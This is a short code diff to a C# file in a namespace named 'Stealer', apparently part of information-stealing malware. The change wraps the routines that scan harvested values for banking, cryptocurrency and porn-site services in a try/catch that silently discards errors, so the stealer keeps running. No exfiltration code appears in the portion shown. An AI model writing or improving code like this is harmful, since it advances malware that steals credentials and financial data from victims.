@@ -1,4 +1,5 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
 using System.Text.RegularExpressions;
 
 namespace Stealer
@@ -69,9 +70,15 @@ namespace Stealer
         // Detect all
         public static void ScanData(string value)
         {
-            DetectBankingServices(value);
-            DetectCryptocurrencyServices(value);
-            DetectPornServices(value);
+            try
+            {
+                DetectBankingServices(value);
+                DetectCryptocurrencyServices(value);
+                DetectPornServices(value);
+            } catch (Exception ex)
+            {
+                //Console.WriteLine("Exception while analyzing value : " + value + ", error:\n" + ex);
+            }
         }
 
 
